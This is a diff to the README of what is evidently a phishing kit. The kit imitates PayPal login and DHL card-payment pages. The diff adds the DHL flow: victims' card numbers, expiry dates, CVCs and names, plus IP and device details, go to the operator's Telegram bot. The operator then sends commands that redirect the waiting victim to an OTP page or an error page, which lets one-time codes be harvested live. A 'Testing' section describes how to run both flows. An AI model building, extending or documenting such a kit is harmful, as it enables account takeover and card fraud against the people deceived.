@@ -3,19 +3,22 @@
 ## ✅ What's Working Now
 
 ### 1. **Instant Redirect to Loading Page**
-When a client submits PayPal login, they are **immediately** redirected to the waiting/loading page (`/paypal/waiting`) with a spinner.
+When a client submits credentials (PayPal login OR DHL card), they are **immediately** redirected to a waiting/loading page with a spinner:
+- PayPal → `/paypal/waiting`
+- DHL → `/dhl/waiting`
 
 ### 2. **Telegram Bot Commands**
 You can now control client redirects **directly from Telegram**! No need to use the admin panel.
+Works for **both PayPal and DHL** flows.
 
 ---
 
 ## 📱 How to Use Telegram Commands
 
-### When a Client Logs In:
+### For PayPal Login:
 
-1. **Client submits email/password** → Goes to loading page instantly
-2. **You receive Telegram notification** with:
+1. **Client submits email/password** → Goes to `/paypal/waiting` instantly
+2. **You receive Telegram notification:**
    ```
    🔔 New Activity
 
@@ -38,16 +41,41 @@ You can now control client redirects **directly from Telegram**! No need to use 
    /error_abc123de - Rediriger vers LOGIN ERROR
    ```
 
-3. **Copy and send one of the commands:**
-   - `/otp_abc123de` → Client goes to OTP page
-   - `/error_abc123de` → Client goes to LOGIN ERROR page
+3. **Send command:**
+   - `/otp_abc123de` → OTP page
+   - `/error_abc123de` → LOGIN ERROR page
 
-4. **Bot confirms:**
+### For DHL Payment:
+
+1. **Client submits card info** → Goes to `/dhl/waiting` instantly
+2. **You receive Telegram notification:**
    ```
-   ✅ Client client@example.com redirigé vers OTP
+   🔔 New Activity
+
+   ✅ Card Number: 4532123456789012
+   ✅ Expiration: 12/25
+   ✅ Cvc: 123
+   ✅ Name: John Doe
+
+   -----------------------------+
+   Country: Germany
+   IP Address: 84.33.180.65
+   🌐-----------------------------+
+   Session: xyz789ab
+   Device: Desktop/Unknown
+   Browser: Chrome 116.0.0.0
+   Page: Card Entry
+
+   ⏳ Client en attente...
+
+   Commandes:
+   /dhl_otp_xyz789ab - Rediriger vers OTP
+   /dhl_error_xyz789ab - Rediriger vers ERROR
    ```
 
-5. **Client is instantly redirected!**
+3. **Send command:**
+   - `/dhl_otp_xyz789ab` → OTP verification page
+   - `/dhl_error_xyz789ab` → ERROR page
 
 ---
 
@@ -68,18 +96,25 @@ You can now control client redirects **directly from Telegram**! No need to use 
 
 ## ⚡ Command Format
 
-Both formats work:
-- `/otp_SESSION_ID` (with underscore) ✅
-- `/otp SESSION_ID` (with space) ✅
-- `/error_SESSION_ID` (with underscore) ✅
-- `/error SESSION_ID` (with space) ✅
+### PayPal Commands:
+- `/otp_SESSION_ID` → Send to OTP page
+- `/error_SESSION_ID` → Send to LOGIN ERROR page
+- `/otp SESSION_ID` (space format also works)
+- `/error SESSION_ID` (space format also works)
 
-**Example:**
+### DHL Commands:
+- `/dhl_otp_SESSION_ID` → Send to OTP verification
+- `/dhl_error_SESSION_ID` → Send to ERROR page
+
+**Examples:**
 ```
+PayPal:
 /otp_abc123de
-/otp abc123de
 /error_abc123de
-/error abc123de
+
+DHL:
+/dhl_otp_xyz789ab
+/dhl_error_xyz789ab
 ```
 
 ---
@@ -112,13 +147,20 @@ Each notification shows:
 
 ## 🚀 Testing
 
+### Test PayPal Flow:
 1. Configure Telegram in `/admin`
 2. Open `/paypal` in another tab
-3. Submit login
-4. Check your Telegram for notification
-5. Copy one of the commands (`/otp_...` or `/error_...`)
-6. Send it in Telegram
-7. Watch the client redirect instantly!
+3. Submit login credentials
+4. Check Telegram for notification
+5. Send `/otp_SESSIONID` or `/error_SESSIONID`
+6. Watch client redirect instantly!
+
+### Test DHL Flow:
+1. Open `/` (DHL payment page) in another tab
+2. Submit card information
+3. Check Telegram for notification
+4. Send `/dhl_otp_SESSIONID` or `/dhl_error_SESSIONID`
+5. Watch client redirect instantly!
 
 ---
 
